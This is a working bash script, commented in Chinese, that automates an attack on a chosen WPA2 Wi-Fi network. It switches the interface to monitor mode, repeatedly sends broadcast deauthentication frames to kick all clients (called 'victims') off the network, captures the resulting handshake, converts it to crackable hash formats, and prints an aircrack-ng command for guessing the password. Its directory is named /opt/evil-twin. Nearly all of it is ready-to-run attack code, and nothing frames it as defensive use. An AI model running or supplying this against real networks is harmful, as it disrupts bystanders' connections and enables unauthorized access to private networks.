#!/usr/bin/env bash
# ============================================================
# 自动抓取目标 WiFi 的 WPA2 握手
# 原理: airodump 固定信道监听 + 广播 deauth 踢所有客户端,
#       受害者手机/设备被踢后会自动重连真 AP, 产生完整 4 次握手
# 用法: sudo bash auto_capture_handshake.sh <BSSID> <CHANNEL> <输出名前缀>
#   例: sudo bash auto_capture_handshake.sh C8:75:F4:40:D6:8A 6 gf7e
# ============================================================
set -e
export PATH=$PATH:/usr/sbin:/usr/local/sbin

BSSID="${1:?用法: $0 <BSSID> <信道> <名前缀>}"
CH="${2:?}"
PREFIX="${3:-handshake}"
IFACE="${WIFI_IFACE:-$(ls /sys/class/net | grep -E '^wl' | head -1)}"
BASE_DIR="${EVIL_BASE_DIR:-/opt/evil-twin}"
WORK="$BASE_DIR/handshakes"
mkdir -p "$WORK"

echo "==> 目标: $BSSID  ch$CH  网卡: $IFACE  输出: $WORK/$PREFIX"

echo "==> [1/4] 切监听模式 + 固定信道..."
nmcli dev set "$IFACE" managed no 2>/dev/null || true
ip link set "$IFACE" down
iw dev "$IFACE" set type monitor
ip link set "$IFACE" up
iw dev "$IFACE" set channel "$CH"
sleep 2

echo "==> [2/4] 后台 airodump 抓包 (140 秒)..."
timeout 140 airodump-ng --bssid "$BSSID" -c "$CH" -w "$WORK/$PREFIX" "$IFACE" > /dev/null 2>&1 &
ADPID=$!
sleep 4

echo "==> [3/4] 循环广播 deauth 触发重连 (4 轮)..."
for i in 1 2 3 4; do
  echo "   --- deauth round $i ---"
  timeout 5 aireplay-ng -0 3 -a "$BSSID" "$IFACE" 2>&1 | grep -c Sending || true
  sleep 20
done
wait $ADPID

echo "==> [4/4] 提取 hash..."
CAP=$(ls "$WORK/$PREFIX"-01.cap 2>/dev/null | head -1)
if [ -z "$CAP" ]; then echo "错误: 未生成 pcap 文件"; exit 1; fi
echo "   pcap: $CAP"
hcxpcapngtool -o "$WORK/$PREFIX.22000" "$CAP" 2>&1 | grep -aE "EAPOL M1|EAPOL M2|22000" | head -5 || true
hcxpcapngtool --hccapx="$WORK/$PREFIX.hccapx" "$CAP" 2>&1 | grep -aE "hccapx|RC" | head -3 || true
ls -la "$WORK/$PREFIX".22000 "$WORK/$PREFIX".hccapx 2>/dev/null || true

echo "==> 恢复网卡..."
ip link set "$IFACE" down
iw dev "$IFACE" set type managed
ip link set "$IFACE" up
nmcli dev set "$IFACE" managed yes 2>/dev/null || true

echo "==> 完成。验证密码:"
echo "   echo '候选密码' | aircrack-ng -w - -b $BSSID $WORK/$PREFIX.hccapx"
